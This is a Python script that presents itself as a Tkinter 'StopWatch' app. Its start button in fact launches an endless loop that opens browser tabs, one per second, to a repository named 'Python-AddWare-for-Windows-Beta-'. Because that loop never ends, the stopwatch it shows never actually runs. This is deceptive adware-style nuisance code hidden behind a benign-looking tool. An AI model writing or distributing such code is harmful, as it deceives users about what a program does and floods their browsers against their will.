#Importation necessary libraries
import webbrowser
import time
import tkinter as tk

# Pure Python function to open URL
def open_url(url):
    webbrowser.open(url)
    print("Opening URL:", url)
    if url == "https://github.com/SudoBlank/Python-AddWare-for-Windows-Beta-":
        print("Defoult URL Detected")

def spamopenaurl(MasterURL1, MasterURL2, MasterURL3, MasterURL4, MasterURL5, interval):
    while True:
        time.sleep(interval)
        open_url(MasterURL1)
        time.sleep(interval)
        open_url(MasterURL2)
        time.sleep(interval)
        open_url(MasterURL3)
        time.sleep(interval)
        open_url(MasterURL4)
        time.sleep(interval)
        open_url(MasterURL5)

def StartStopWatch(MasterURL1, MasterURL2, MasterURL3, MasterURL4, MasterURL5, interval):
    print("Starting StopWatch...")
    StopWatchTime = 0
    spamopenaurl(MasterURL1, MasterURL2, MasterURL3, MasterURL4, MasterURL5, interval)
    while True:
        time.sleep(1)
        StopWatchTime += 1
        TextDisplayForTime.config(text="StopWatch Time: " + str(StopWatchTime))  # Update the label


# Tkinter function to initialize the GUI
root = tk.Tk()
def OpenStartGui(MasterURL1, MasterURL2, MasterURL3, MasterURL4, MasterURL5, interval):
    root.title("StopWatch")
    root.geometry("300x100")

    global TextDisplayForTime  # Make this global so it can be updated in StartStopWatch
    TextDisplayForTime = tk.Label(root, text="Click the button to start the StopWatch")
    TextDisplayForTime.pack(pady=10)

    Startbutton = tk.Button(root, text="Start StopWatch", command=lambda: StartStopWatch(MasterURL1, MasterURL2, MasterURL3, MasterURL4, MasterURL5, interval))
    Startbutton.pack(pady=5)

    root.mainloop()


# Replace these URLs with the ones you want to open
Url_To_Open1 = "https://github.com/SudoBlank/Python-AddWare-for-Windows-Beta-" 
Url_To_Open2 = "https://github.com/SudoBlank/Python-AddWare-for-Windows-Beta-"
Url_To_Open3 = "https://github.com/SudoBlank/Python-AddWare-for-Windows-Beta-"
Url_To_Open4 = "https://github.com/SudoBlank/Python-AddWare-for-Windows-Beta-"
Url_To_Open5 = "https://github.com/SudoBlank/Python-AddWare-for-Windows-Beta-"

#Time interval in seconds for opening the URLs
interval = 1

# Call the function to open the App !!!Do not remove!!!
OpenStartGui(Url_To_Open1, Url_To_Open2, Url_To_Open3, Url_To_Open4, Url_To_Open5, interval)  # Call the function to start the App with the URL you provided